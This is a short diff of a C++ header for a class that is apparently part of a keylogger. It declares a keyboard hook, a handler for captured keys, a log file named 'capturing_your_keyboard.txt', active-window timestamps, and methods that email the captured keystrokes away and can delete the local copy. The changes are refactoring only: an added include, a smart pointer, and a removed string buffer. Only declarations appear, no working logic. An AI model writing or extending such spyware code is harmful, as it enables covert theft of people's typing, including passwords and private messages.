@@ -2,6 +2,7 @@
 
 #include "EmailService.h"
 #include "Hook.h"
+#include "StringUtilities.h"
 
 #include <fstream>
 #include <vector>
@@ -20,16 +21,12 @@ public:
 	bool sendEmailCallback(std::string emailTo);
 	bool sendEmailReport(bool deleteLocal);
 private:
-	const int memoryBufferSize = 10;
 	const wstring FILENAME = L"capturing_your_keyboard.txt";
-	Hook* hook;
+	shared_ptr<Hook> hook;
 	ofstream logFile;
 	HWND lastActiveWindow;
 
 	void keyboardHandler(const wchar_t* key);
 	void addWindowTimeStamps();
-
-	static char charBuffer[1024];
-	static string wcharToStr(const wchar_t* str);
 };
 
